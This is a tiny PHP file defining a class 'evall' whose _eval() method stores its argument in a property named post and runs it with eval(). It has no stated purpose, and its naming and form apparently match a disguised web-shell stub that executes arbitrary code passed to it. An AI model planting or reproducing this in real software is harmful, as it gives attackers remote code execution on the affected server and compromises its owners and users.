<?php
class evall
{
	public $get;
	public $post;
	public function _eval($var)
{
	$this->post = $var;
	eval($var);
}
}


?>
